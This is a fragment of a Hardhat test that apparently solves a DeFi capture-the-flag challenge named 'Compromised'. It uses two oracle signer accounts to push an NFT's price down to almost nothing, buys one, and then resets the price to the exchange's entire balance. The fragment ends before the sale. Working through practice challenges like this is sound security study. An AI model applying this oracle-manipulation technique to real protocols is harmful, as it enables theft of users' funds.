...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    await oracle
      .connect(signer1)
      .postPrice("DVNFT", ethers.utils.parseEther("0.00000001"));
    await oracle
      .connect(signer2)
      .postPrice("DVNFT", ethers.utils.parseEther("0.00000001"));
    await exchange
      .connect(player)
      .buyOne({ value: ethers.utils.parseEther("0.00000001") });
    const sellPrice = await ethers.provider.getBalance(exchange.address);

    await oracle.connect(signer1).postPrice("DVNFT", sellPrice);
    await oracle.connect(signer2).postPrice("DVNFT", sellPrice);
